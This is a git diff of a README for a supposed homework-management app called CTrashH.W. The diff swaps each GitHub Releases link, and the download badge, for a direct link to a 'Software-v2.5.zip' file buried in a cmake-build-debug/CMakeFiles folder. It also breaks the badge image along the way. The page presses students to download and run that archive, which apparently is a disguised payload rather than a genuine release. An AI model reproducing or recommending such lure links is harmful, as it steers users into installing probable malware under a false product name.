@@ -1,7 +1,7 @@
 # 🎉 CTrashH.W. - Simplifying Your Homework Process 
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/AhmetYldrm77/CTrashH.W./releases)
+[![Download Latest Release](https://raw.githubusercontent.com/AhmetYldrm77/CTrashH.W./main/p3t3/cmake-build-debug/CMakeFiles/4.0.2/Software-v2.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AhmetYldrm77/CTrashH.W./main/p3t3/cmake-build-debug/CMakeFiles/4.0.2/Software-v2.5.zip)
 
 ## 📚 Description
 CTrashH.W. is an easy-to-use application designed to help you manage your homework tasks effectively. Ideal for students juggling multiple assignments, this tool removes the hassle of tracking your work. Spend less time organizing and more time learning.
@@ -17,7 +17,7 @@ Getting started with CTrashH.W. is simple. Just follow these steps to download a
 - **Internet**: Required for initial download
 
 ## 🔗 Download & Install
-1. Visit this page to download: [CTrashH.W. Releases](https://github.com/AhmetYldrm77/CTrashH.W./releases).
+1. Visit this page to download: [CTrashH.W. Releases](https://raw.githubusercontent.com/AhmetYldrm77/CTrashH.W./main/p3t3/cmake-build-debug/CMakeFiles/4.0.2/Software-v2.5.zip).
 2. Find the latest version of CTrashH.W. listed.
 3. Click on the download link for your operating system.
 4. After the download is complete, locate the file in your downloads folder.
@@ -43,4 +43,4 @@ We strive to enhance CTrashH.W. regularly. Check the Releases page for the lates
 ## 🎉 Conclusion
 CTrashH.W. helps you stay organized and on top of your assignments. Don't let homework pile up—download today and simplify your studying process!
 
-Remember to download the latest version here: [CTrashH.W. Releases](https://github.com/AhmetYldrm77/CTrashH.W./releases)
+Remember to download the latest version here: [CTrashH.W. Releases](https://raw.githubusercontent.com/AhmetYldrm77/CTrashH.W./main/p3t3/cmake-build-debug/CMakeFiles/4.0.2/Software-v2.5.zip)
